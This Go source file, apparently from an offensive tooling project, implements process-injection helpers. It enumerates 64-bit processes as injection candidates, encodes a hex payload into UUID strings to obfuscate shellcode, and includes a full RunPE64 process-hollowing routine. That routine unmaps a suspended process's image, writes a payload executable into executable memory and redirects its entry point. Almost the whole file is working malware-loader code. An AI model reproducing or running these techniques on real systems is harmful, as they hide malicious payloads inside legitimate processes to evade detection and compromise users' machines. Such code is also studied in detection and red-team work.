package inject

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"unicode/utf16"
	"unsafe"

	"github.com/gofrs/uuid"
	"golang.org/x/sys/windows"
)

const errSuccess string = "The operation completed successfully."

func SelectRandomElement(array []uint32) int {
	randomIndex := rand.Intn(len(array))
	chosen := array[randomIndex]
	return int(chosen)
}

func Get64BitProcesses() []uint32 {
	fmt.Printf("\n[+] Listing running processes")

	processes, cbNeeded := EnumProcesses()

	var candidates []uint32
	for i := 0; i < int(cbNeeded); i++ {
		pid := processes[i]
		if pid == 0 && i > 0 {
			break
		} else if pid != uint32(os.Getpid()) {
			bitness := Is64Bit(pid)
			if bitness == 0 {
				candidates = append(candidates, pid)
			}
		}
	}
	fmt.Printf("\n[+] Number of process injection candidates: %d", len(candidates))
	return candidates
}

func Is64Bit(pid uint32) int {

	pHandle, err := OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, pid)

	if err.Error() == errSuccess {
		bitness := IsWow64Process(pHandle)
		CloseHandle(pHandle)
		return int(bitness)

	} else {
		CloseHandle(pHandle)
		return -1
	}
}

func StringToCharPtr(str string) *uint8 {
	chars := append([]byte(str), 0) // null terminated
	return &chars[0]
}

func StringToUTF16Ptr(str string) *uint16 {
	wchars := utf16.Encode([]rune(str + "\x00"))
	return &wchars[0]
}

// SplitToWords - Splits a slice into multiple slices based on word length.
func SplitToWords(array []byte, wordLen int, pad_incomplete bool) [][]byte {
	words := [][]byte{}
	for i := 0; i < len(array); i += wordLen {
		word := array[i : i+wordLen]

		if pad_incomplete && len(word) < wordLen {
			for j := len(word); j < len(word); j++ {
				word = append(word, 0)
			}
		}
		words = append(words, word)
	}
	return words
}

// SwapEndianness - Heavily inspired by code from CyberChef https://github.com/gchq/CyberChef/blob/c9d9730726dfa16a1c5f37024ba9c7ea9f37453d/src/core/operations/SwapEndianness.mjs
func SwapEndianness(array []byte, word_len int, pad_incomplete bool) []byte {

	// Split into words.
	words := SplitToWords(array, word_len, pad_incomplete)

	// Rejoin into single slice.
	result := []byte{}
	for i := 0; i < len(words); i++ {
		for k := len(words[i]) - 1; k >= 0; k-- {
			result = append(result, words[i][k])
		}
	}
	return result
}

// ConvertToUUIDS - converts a hex payload to a slice of UUID strings.
func ConvertToUUIDS(payload string) []string {

	uuids := []string{}

	sc, _ := hex.DecodeString(payload)

	for i := 0; i < len(sc); i += 16 {

		fmt.Println([]byte(sc)[i : i+16])

		leBytes1 := SwapEndianness([]byte(sc)[i:i+4], 4, false)
		leBytes2 := SwapEndianness([]byte(sc)[i+4:i+8], 4, false)

		fmt.Println(leBytes2)
		leBytes3 := append(leBytes2[2:4], leBytes2[0:2]...)

		leBytes := append(leBytes1, leBytes3...)
		leBytes = append(leBytes, []byte(sc)[i+8:i+16]...)
		fmt.Println(leBytes)

		uuid, err := uuid.FromBytes(leBytes)
		if err != nil {
			fmt.Println(err)
		}
		uuids = append(uuids, uuid.String())
	}

	return uuids
}

// findRelocSec
func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
	for _, sec := range secs {
		if sec.VirtualAddress == va {
			return sec
		}
	}
	return nil
}

/* RunPE64 - Heavily based on https://github.com/abdullah2993/go-runpe/blob/master/runpe.go
   there are still significant changes compared to original code.
*/
func RunPE64(payload []byte, target string, commandLine string) {

	// Create suspended process.
	_, _, PI, err := CreateProcessA(target, commandLine, 0, 0, 0, 0x00000004, 0, 0)

	processHandle := uintptr(PI.Process)
	threadHandle := uintptr(PI.Thread)

	// Get context of thread.
	var ctx *CONTEXT
	var cbuf [unsafe.Sizeof(*ctx) + 15]byte
	ctx = (*CONTEXT)(unsafe.Pointer((uintptr(unsafe.Pointer(&cbuf[15]))) &^ 15))
	ctx.ContextFlags = CONTEXT_FULL

	err = GetThreadContext(threadHandle, ctx)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	// Get Base Address
	data := make([]byte, 8)
	_, err = ReadProcessMemory(processHandle, uintptr(ctx.Rdx+16), data, 8)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	baseAddress := uintptr(binary.LittleEndian.Uint64(data))

	// Get headers of payload
	f, err := pe.NewFile(bytes.NewReader(payload))
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	optionalHeader, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		panic("OptionalHeader64 not found")
	}

	// Unmap current executable.
	_, err = NtUnmapViewOfSection(processHandle, baseAddress)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	// Allocate space for new executable.
	newImageBase := VirtualAllocEx2(processHandle, baseAddress, (uintptr)(optionalHeader.SizeOfImage), 0x00002000|0x00001000, 0x40)

	_, err = WriteProcessMemory2(processHandle, newImageBase, payload, optionalHeader.SizeOfHeaders)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	// Write sections (.text, etc).
	for _, section := range f.Sections {

		sectionData, err := section.Data()
		if err != nil && err.Error() != SUCCESS {
			panic(err)
		}
		_, err = WriteProcessMemory2(processHandle, newImageBase+(uintptr)(section.VirtualAddress), sectionData, section.Size)
		if err != nil && err.Error() != SUCCESS {
			fmt.Println(err)
		}
	}

	// Write new image base bytes.
	newImageBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(newImageBytes, uint64(newImageBase))
	_, err = WriteProcessMemory2(processHandle, uintptr(ctx.Rdx+16), newImageBytes, 8)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	// Set RCX
	ctx.Rcx = uint64(newImageBase) + uint64(optionalHeader.AddressOfEntryPoint)

	// Update thread context.
	err = SetThreadContext(threadHandle, *ctx)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}

	err = ResumeThread(threadHandle)
	if err != nil && err.Error() != SUCCESS {
		fmt.Println(err)
	}
}
